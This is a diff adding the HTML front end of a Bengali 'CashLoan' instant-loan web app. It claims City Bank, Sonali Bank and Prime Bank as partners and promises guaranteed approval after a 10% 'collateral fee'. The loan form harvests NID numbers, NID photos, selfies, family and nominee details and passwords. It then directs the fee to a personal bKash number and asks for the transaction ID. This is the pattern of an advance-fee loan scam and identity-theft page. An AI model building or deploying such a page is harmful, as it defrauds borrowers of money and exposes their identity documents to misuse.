@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>CashLoan - Premium Instant Loan</title>
+  <link rel="manifest" href="/manifest.json">
+  <meta name="theme-color" content="#16a34a">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+</head>
+<body>
+
+  <!-- Custom Alert Modal -->
+  <div id="customAlert" class="custom-alert-overlay hidden">
+    <div class="custom-alert-box">
+      <div id="alertIcon" class="alert-icon"></div>
+      <h3 id="alertTitle">সফল!</h3>
+      <p id="alertMessage">আপনার কাজ সম্পন্ন হয়েছে।</p>
+      <button class="alert-btn" onclick="closeAlert()">ঠিক আছে</button>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
+  <div id="toastContainer" class="toast-container"></div>
+
+  <!-- Splash -->
+  <div id="splash" class="splash">
+    <div class="logo-box"><i class="fa-solid fa-building-columns"></i></div>
+    <h1>CashLoan</h1>
+    <p>100% Secure & Instant Loan</p>
+  </div>
+
+  <!-- Registration Screen -->
+  <div id="registerScreen" class="screen hidden">
+    <div class="auth-header">
+      <div class="logo-box"><i class="fa-solid fa-building-columns"></i></div>
+      <h2>CashLoan</h2>
+      <p>Official Loan Partner</p>
+    </div>
+    <div class="auth-body">
+      <h3>অ্যাকাউন্ট তৈরি করুন</h3>
+      <div class="profile-upload-wrapper" onclick="document.getElementById('regProfile').click()">
+        <img id="regProfilePreview" src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Profile">
+        <div class="camera-icon"><i class="fa-solid fa-camera"></i></div>
+      </div>
+      <input type="file" id="regProfile" accept="image/*" style="display:none" onchange="previewImage(this, 'regProfilePreview')">
+      
+      <input type="text" id="regName" placeholder="আপনার নাম">
+      <input type="text" id="regPhone" placeholder="মোবাইল নাম্বার">
+      <input type="email" id="regEmail" placeholder="ইমেইল (ঐচ্ছিক)">
+      <input type="password" id="regPassword" placeholder="পাসওয়ার্ড">
+      <button class="btn-primary" onclick="showOtpScreen()">রেজিস্ট্রেশন করুন <i class="fa-solid fa-arrow-right"></i></button>
+      <p style="text-align:center; margin-top:20px; font-size:13px;">Already have an account? <a href="#" onclick="showLogin()" style="color:#16a34a; font-weight:bold;">Login</a></p>
+    </div>
+  </div>
+
+  <!-- OTP Verification Screen -->
+  <div id="otpScreen" class="screen hidden">
+    <div class="auth-header">
+      <div class="logo-box"><i class="fa-solid fa-shield-halved"></i></div>
+      <h2>OTP ভেরিফিকেশন</h2>
+      <p>আপনার মোবাইলে পাঠানো ৪ ডিজিটের কোড দিন</p>
+    </div>
+    <div class="auth-body">
+      <div style="display:flex; justify-content:center; gap:10px; margin: 20px 0;">
+        <input type="number" id="otp1" maxlength="1" style="width:50px; height:60px; text-align:center; font-size:24px; font-weight:bold; border-radius:10px; border:2px solid #e2e8f0;">
+        <input type="number" id="otp2" maxlength="1" style="width:50px; height:60px; text-align:center; font-size:24px; font-weight:bold; border-radius:10px; border:2px solid #e2e8f0;">
+        <input type="number" id="otp3" maxlength="1" style="width:50px; height:60px; text-align:center; font-size:24px; font-weight:bold; border-radius:10px; border:2px solid #e2e8f0;">
+        <input type="number" id="otp4" maxlength="1" style="width:50px; height:60px; text-align:center; font-size:24px; font-weight:bold; border-radius:10px; border:2px solid #e2e8f0;">
+      </div>
+      <p style="text-align:center; font-size:13px; color:#64748b; margin-bottom:20px;">কোড পাননি? <a href="#" style="color:#16a34a; font-weight:bold;" onclick="showAlert('সফল!', 'OTP পুনরায় পাঠানো হয়েছে', 'success')">Resend</a></p>
+      <button class="btn-primary" onclick="verifyOtp()">ভেরিফাই করুন <i class="fa-solid fa-check-circle"></i></button>
+    </div>
+  </div>
+
+  <!-- Login Screen -->
+  <div id="loginScreen" class="screen hidden">
+    <div class="auth-header">
+      <div class="logo-box"><i class="fa-solid fa-building-columns"></i></div>
+      <h2>CashLoan</h2>
+      <p>Welcome Back!</p>
+    </div>
+    <div class="auth-body">
+      <h3>Login</h3>
+      <input type="text" id="loginPhone" placeholder="মোবাইল নাম্বার">
+      <input type="password" id="loginPassword" placeholder="পাসওয়ার্ড">
+      <button class="btn-primary" onclick="login()">লগইন <i class="fa-solid fa-arrow-right"></i></button>
+      <p style="text-align:center; font-size:13px; margin-top:15px;">Don't have an account? <a href="#" onclick="showRegister()" style="color:#16a34a; font-weight:bold;">Register</a></p>
+    </div>
+  </div>
+
+  <!-- Home App (Same as before) -->
+  <div id="homeScreen" class="screen hidden">
+    <div class="home-top">
+      <div class="user-info" onclick="showPage('profilePage')">
+        <img id="homeProfilePic" src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="nav-profile-pic">
+        <div>
+          <p style="opacity:0.8; font-size:12px;">স্বাগতম,</p>
+          <h2 id="userName" style="font-size:16px;">User</h2>
+        </div>
+      </div>
+      <i class="fa-solid fa-bell notification-icon" onclick="showPage('notificationPage')"></i>
+    </div>
+
+    <!-- Page 1: Main -->
+    <div id="mainPage" class="page-content active">
+      <div class="main-card">
+        <p style="color:#64748b; font-size:14px;">সর্বোচ্চ ঋণের পরিমাণ (৳)</p>
+        <h1 style="font-size:38px; color:#16a34a; font-weight:800; margin:5px 0 20px;">৳ <span id="balance">0</span></h1>
+        <button class="btn-apply" onclick="showPage('loanPage')"><i class="fa-solid fa-bolt"></i> এখনই আবেদন করুন!</button>
+        <p style="font-size:12px; color:#16a34a; margin-top:10px; font-weight:600;"><i class="fa-solid fa-check-circle"></i> ৯৯% সফলতার হার</p>
+      </div>
+
+      <div class="partners-section">
+        <p>Our Official Banking Partners</p>
+        <div class="partners-logo-grid">
+          <svg width="80" height="20" viewBox="0 0 100 25"><rect width="100" height="25" fill="#ec1c24" rx="4"/><text x="50" y="17" fill="white" font-family="sans-serif" font-size="10" font-weight="bold" text-anchor="middle">City Bank</text></svg>
+          <svg width="80" height="20" viewBox="0 0 100 25"><rect width="100" height="25" fill="#006633" rx="4"/><text x="50" y="17" fill="white" font-family="sans-serif" font-size="10" font-weight="bold" text-anchor="middle">Sonali Bank</text></svg>
+          <svg width="80" height="20" viewBox="0 0 100 25"><rect width="100" height="25" fill="#003399" rx="4"/><text x="50" y="17" fill="white" font-family="sans-serif" font-size="10" font-weight="bold" text-anchor="middle">Prime Bank</text></svg>
+        </div>
+      </div>
+
+      <div class="services-grid">
+        <div class="service-item" onclick="showPage('loanPage')"><div class="service-icon bg-blue"><i class="fa-solid fa-bolt"></i></div><p>Instant Loan</p></div>
+        <div class="service-item" onclick="showPage('walletPage')"><div class="service-icon bg-green"><i class="fa-solid fa-wallet"></i></div><p>Wallet</p></div>
+        <div class="service-item" onclick="showPage('repaymentPage')"><div class="service-icon bg-orange"><i class="fa-solid fa-hand-holding-dollar"></i></div><p>Repayment</p></div>
+        <div class="service-item" onclick="showPage('profilePage')"><div class="service-icon bg-purple"><i class="fa-solid fa-user"></i></div><p>Profile</p></div>
+        <div class="service-item" onclick="showPage('policyPage')"><div class="service-icon bg-teal"><i class="fa-solid fa-file-contract"></i></div><p>Policy</p></div>
+        <div class="service-item" onclick="showAlert('সাপোর্ট!', 'লাইভ চ্যাট শীঘ্রই ওপেন হবে', 'success')"><div class="service-icon bg-red"><i class="fa-solid fa-headset"></i></div><p>Support</p></div>
+      </div>
+
+      <div class="trust-poster">
+        <div class="poster-icon"><i class="fa-solid fa-shield-halved"></i></div>
+        <div class="poster-text"><h3>১০০% গ্যারান্টি!</h3><p>১০% জামানত দিলেই ১০০% লোন অ্যাপ্রুভাল।</p></div>
+      </div>
+
+      <div class="live-feed-container">
+        <div class="live-header"><h3><span class="dot"></span> লাইভ লোন বিতরণ 🟢</h3><p>সদ্য ঋণ পেয়েছেন</p></div>
+        <div class="live-feed" id="liveFeed"></div>
+      </div>
+    </div>
+
+    <!-- Page 2: Loan Form (5 Steps) - SAME AS BEFORE -->
+    <div id="loanPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>ঋণের জন্য আবেদন</h3></div>
+      <div class="progress-container">
+        <div class="progress-step active" id="s1">1</div>
+        <div class="progress-line"></div>
+        <div class="progress-step" id="s2">2</div>
+        <div class="progress-line"></div>
+        <div class="progress-step" id="s3">3</div>
+        <div class="progress-line"></div>
+        <div class="progress-step" id="s4">4</div>
+        <div class="progress-line"></div>
+        <div class="progress-step" id="s5">5</div>
+      </div>
+      <div class="progress-text" id="progressText">Step 1 of 5 - 20% Complete</div>
+
+      <div id="step1" class="form-body">
+        <div class="input-group"><label>ঋণের পরিমাণ (৳10,000 - ৳3,00,000)</label><input type="number" id="loanAmount" placeholder="যেমন: ৫০০০০" oninput="calculateLoan()"></div>
+        <div class="input-group"><label>কিস্তির মেয়াদ</label>
+          <select id="loanDuration" onchange="calculateLoan()">
+            <option value="3">৩ মাস (৮% সুদ)</option>
+            <option value="6">৬ মাস (৮% সুদ)</option>
+            <option value="12">১২ মাস (৮% সুদ)</option>
+          </select>
+        </div>
+        <div class="input-group"><label>পেমেন্ট মাধ্যম</label><select id="paymentMethod"><option value="bKash">বিকাশ (bKash)</option><option value="Nagad">নগদ (Nagad)</option></select></div>
+        <div class="fee-summary" style="background:#f0fdf4; border-color:#dcfce7;">
+          <div class="fee-row"><span>মোট কিস্তি</span><span id="emiDisplay" style="color:#16a34a; font-weight:bold;">৳ ০ x ৩ মাস</span></div>
+          <div class="fee-row"><span>১০% জামানত ফি</span><span id="feeDisplay">৳ ০</span></div>
+          <div class="fee-row total"><span>আপনি পাবেন</span><span id="totalDisplay">৳ ০</span></div>
+        </div>
+        <button class="btn-primary" onclick="goToStep(2)">পরবর্তী <i class="fa-solid fa-arrow-right"></i></button>
+      </div>
+
+      <div id="step2" class="form-body hidden">
+        <div class="input-group"><label>আপনার পূর্ণ নাম</label><input type="text" id="fullName" placeholder="যেমন: আব্দুল করিম"></div>
+        <div class="input-group"><label>পিতার নাম</label><input type="text" id="fatherName" placeholder="পিতার নাম"></div>
+        <div class="input-group"><label>মাতার নাম</label><input type="text" id="motherName" placeholder="মাতার নাম"></div>
+        <div class="input-group"><label>জন্ম তারিখ</label><input type="date" id="dob"></div>
+        <button class="btn-primary" onclick="goToStep(3)">পরবর্তী <i class="fa-solid fa-arrow-right"></i></button>
+      </div>
+
+      <div id="step3" class="form-body hidden">
+        <div class="input-group"><label>বর্তমান ঠিকানা</label><input type="text" id="address" placeholder="বাসা/রোড, এলাকা"></div>
+        <div class="input-group"><label>শহর/জেলা</label><input type="text" id="city" placeholder="যেমন: ঢাকা"></div>
+        <div class="input-group"><label>NID নাম্বার</label><input type="text" id="nidNumber" placeholder="আপনার NID নাম্বার"></div>
+        <button class="btn-primary" onclick="goToStep(4)">পরবর্তী <i class="fa-solid fa-arrow-right"></i></button>
+      </div>
+
+      <div id="step4" class="form-body hidden">
+        <div class="input-group"><label>নমিনির নাম</label><input type="text" id="nomineeName" placeholder="নমিনির পূর্ণ নাম"></div>
+        <div class="input-group"><label>নমিনির ফোন</label><input type="text" id="nomineePhone" placeholder="01XXXXXXXXX"></div>
+        <div class="input-group"><label>সম্পর্ক</label><select id="nomineeRelation"><option value="Father">পিতা</option><option value="Mother">মাতা</option><option value="Spouse">স্বামী/স্ত্রী</option><option value="Brother">ভাই</option><option value="Sister">বোন</option></select></div>
+        <div style="display:flex; gap:10px; margin-top:20px;">
+          <button class="btn-primary" style="background:#e2e8f0; color:#475569;" onclick="goToStep(5)">Skip <i class="fa-solid fa-forward"></i></button>
+          <button class="btn-primary" onclick="saveNomineeAndNext()">সেভ করুন <i class="fa-solid fa-arrow-right"></i></button>
+        </div>
+      </div>
+
+      <div id="step5" class="form-body hidden">
+        <div class="upload-group"><label><i class="fa-solid fa-id-card"></i> NID কার্ডের সামনের ছবি</label><div class="camera-buttons"><label class="camera-btn"><i class="fa-solid fa-camera"></i> Camera <input type="file" id="nidFrontCamera" accept="image/*" capture="environment"></label><label class="camera-btn"><i class="fa-solid fa-image"></i> Gallery <input type="file" id="nidFrontGallery" accept="image/*"></label></div></div>
+        <div class="upload-group"><label><i class="fa-solid fa-user-check"></i> ফেস ভেরিফিকেশন (সেলফি)</label><div class="camera-buttons"><label class="camera-btn"><i class="fa-solid fa-camera"></i> Take Selfie <input type="file" id="selfieCamera" accept="image/*" capture="user"></label></div></div>
+        <div class="payment-box"><h4><i class="fa-solid fa-mobile-screen"></i> ১০% জামানত পাঠান</h4><p>নিচের বিকাশ নম্বরে <b id="depositAmountText">০</b> টাকা Send Money করুন:</p><div class="number-box"><span>+8801351343287</span><button onclick="copyNumber()"><i class="fa-solid fa-copy"></i> Copy</button></div></div>
+        <div class="input-group"><label>ট্রানজেকশন আইডি (TrxID) দিন</label><input type="text" id="trxid" placeholder="যেমন: 8N7A2K9X"></div>
+        <button class="btn-primary" onclick="submitLoan()"><i class="fa-solid fa-check-circle"></i> সাবমিট করুন</button>
+      </div>
+    </div>
+
+    <!-- Success Page - SAME -->
+    <div id="successPage" class="page-content hidden">
+      <div class="success-container">
+        <div class="success-icon"><i class="fa-solid fa-circle-check"></i></div>
+        <h2>আবেদন সফল হয়েছে!</h2>
+        <p>আপনার লোন আবেদনটি সফলভাবে জমা হয়েছে।</p>
+        <div class="loan-status-box">
+          <div class="status-row"><span>আবেদন নম্বর:</span><span id="successTrxId">#L123456</span></div>
+          <div class="status-row"><span>লোনের পরিমাণ:</span><span id="successAmount">৳০</span></div>
+          <div class="status-row"><span>স্ট্যাটাস:</span><span style="color:#f57c00; font-weight:700;">পেন্ডিং</span></div>
+        </div>
+        <p style="font-size:13px; color:#64748b; margin: 20px 0;">আপনার আবেদনটি ৫-১০ মিনিটের মধ্যে অ্যাডমিন থেকে যাচাই করা হবে।</p>
+        <button class="btn-primary" onclick="showPage('mainPage')">হোমে ফিরে যান <i class="fa-solid fa-house"></i></button>
+      </div>
+    </div>
+
+    <!-- Wallet Page - SAME -->
+    <div id="walletPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>আমার ওয়ালেট</h3></div>
+      <div class="form-body">
+        <div class="main-card" style="margin:0 0 20px; background:linear-gradient(135deg, #16a34a, #15803d); color:white;">
+          <p style="font-size:14px; opacity:0.9;">মোট ব্যালেন্স</p>
+          <h1 style="font-size:38px; font-weight:800; margin-top:5px;">৳ <span id="walletBalance">0</span></h1>
+        </div>
+        <button class="btn-primary" onclick="showWithdrawForm()"><i class="fa-solid fa-money-bill-transfer"></i> টাকা তুলুন (Withdraw)</button>
+        <div id="withdrawForm" class="hidden" style="margin-top:20px; background:white; padding:20px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.05);">
+          <h3 style="margin-bottom:15px; color:#1e293b;">টাকা তোলার ফর্ম</h3>
+          <div class="input-group"><label>পরিমাণ (৳)</label><input type="number" id="withdrawAmount" placeholder="যেমন: ৫০০০"></div>
+          <div class="input-group"><label>মাধ্যম</label><select id="withdrawMethod"><option value="bKash">বিকাশ</option><option value="Nagad">নগদ</option></select></div>
+          <div class="input-group"><label>আপনার অ্যাকাউন্ট নম্বর</label><input type="text" id="withdrawAccount" placeholder="01XXXXXXXXX"></div>
+          <button class="btn-primary" onclick="submitWithdraw()">রিকোয়েস্ট পাঠান</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Repayment Page - SAME -->
+    <div id="repaymentPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>লোন পরিশোধ (Repayment)</h3></div>
+      <div class="form-body">
+        <div class="policy-box">
+          <h3>আপনার বর্তমান কিস্তি</h3>
+          <p>আপনার কোনো চলমান লোন নেই অথবা কিস্তি পরিশোধ করা হয়েছে।</p>
+        </div>
+        <button class="btn-primary" onclick="showAlert('সফল!', 'পেমেন্ট পেজ ওপেন হয়েছে', 'success')"><i class="fa-solid fa-credit-card"></i> কিস্তি পরিশোধ করুন</button>
+      </div>
+    </div>
+
+    <!-- Notification Page - SAME -->
+    <div id="notificationPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>লাইভ নোটিফিকেশন</h3></div>
+      <div class="form-body">
+        <div class="live-feed" style="height: auto; max-height: 80vh;">
+          <div id="notificationFeed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Profile Page - SAME -->
+    <div id="profilePage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>প্রোফাইল</h3></div>
+      <div class="form-body">
+        <div class="profile-upload-wrapper" onclick="document.getElementById('updateProfile').click()">
+          <img id="updateProfilePreview" src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Profile">
+          <div class="camera-icon"><i class="fa-solid fa-camera"></i></div>
+        </div>
+        <input type="file" id="updateProfile" accept="image/*" style="display:none" onchange="previewImage(this, 'updateProfilePreview')">
+        <div class="input-group"><label>Full Name</label><input type="text" id="updateName" placeholder="Your Name"></div>
+        <div class="input-group"><label>Email Address</label><input type="email" id="updateEmail" placeholder="Your Email"></div>
+        <div class="input-group"><label>New Password (Leave blank to keep old)</label><input type="password" id="updatePassword" placeholder="New Password"></div>
+        <button class="btn-primary" onclick="updateProfile()">Save Changes <i class="fa-solid fa-save"></i></button>
+      </div>
+    </div>
+
+    <!-- Policy Page - SAME -->
+    <div id="policyPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>লোন পলিসি</h3></div>
+      <div class="form-body">
+        <div class="policy-box" style="background:#f0fdf4; border:1px solid #bbf7d0;">
+          <h3>লোন পলিসি</h3>
+          <p>আমাদের সিস্টেম City Bank, Sonali Bank এবং Prime Bank-এর অনুমোদিত গাইডলাইন অনুসরণ করে। ১০% জামানত ফি নিশ্চিত করার পরেই লোন অ্যাপ্রুভাল প্রক্রিয়া সম্পন্ন হয়।</p>
+        </div>
+        <div class="setting-item" onclick="showAlert('সফল!', 'লোন অ্যাগ্রিমেন্ট ওপেন হয়েছে', 'success')"><i class="fa-solid fa-file-contract"></i> Loan Agreement</div>
+        <div class="setting-item" onclick="showAlert('সফল!', 'প্রাইভেসি পলিসি ওপেন হয়েছে', 'success')"><i class="fa-solid fa-shield"></i> Privacy Policy</div>
+        <div class="setting-item" onclick="showAlert('সফল!', 'কন্টাক্ট সাপোর্ট ওপেন হয়েছে', 'success')"><i class="fa-solid fa-headset"></i> Contact Support</div>
+      </div>
+    </div>
+
+    <!-- History Page - SAME -->
+    <div id="historyPage" class="page-content hidden">
+      <div class="page-header"><i class="fa-solid fa-arrow-left" onclick="showPage('mainPage')"></i><h3>লোন হিস্ট্রি</h3></div>
+      <div class="form-body" id="historyList"></div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+      <div class="nav-item active" onclick="showPage('mainPage')"><i class="fa-solid fa-house"></i><span>Home</span></div>
+      <div class="nav-item" onclick="showPage('loanPage')"><i class="fa-solid fa-hand-holding-dollar"></i><span>Loan</span></div>
+      <div class="nav-item" onclick="showPage('historyPage')"><i class="fa-solid fa-clock-rotate-left"></i><span>History</span></div>
+      <div class="nav-item" onclick="showPage('profilePage')"><i class="fa-solid fa-user"></i><span>Profile</span></div>
+    </div>
+  </div>
+
+  <!-- Live Chat Button -->
+  <div class="live-chat-btn" onclick="showAlert('সাপোর্ট!', 'লাইভ চ্যাট শীঘ্রই ওপেন হবে', 'success')">
+    <i class="fa-solid fa-comments"></i>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      document.getElementById('splash').style.display = 'none';
+      const savedUser = localStorage.getItem('loan_user');
+      if (savedUser) { currentUser = JSON.parse(savedUser); loadUserData(); } else { document.getElementById('registerScreen').classList.remove('hidden'); }
+    }, 2000);
+  </script>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
+<script>
+  // PWA Install Button
+  let deferredPrompt;
+  window.addEventListener('beforeinstallprompt', (e) => {
+    e.preventDefault();
+    deferredPrompt = e;
+    const installBtn = document.createElement('button');
+    installBtn.innerHTML = '<i class="fa-solid fa-download"></i> Install App';
+    installBtn.style.cssText = 'position:fixed; bottom:160px; right:20px; background:#16a34a; color:white; border:none; padding:12px 20px; border-radius:30px; font-weight:bold; box-shadow:0 4px 15px rgba(22,163,74,0.4); z-index:9999; display:flex; align-items:center; gap:8px;';
+    installBtn.onclick = () => {
+      deferredPrompt.prompt();
+      deferredPrompt.userChoice.then((choiceResult) => {
+        if (choiceResult.outcome === 'accepted') {
+          installBtn.remove();
+        }
+      });
+    };
+    document.body.appendChild(installBtn);
+  });
+</script>
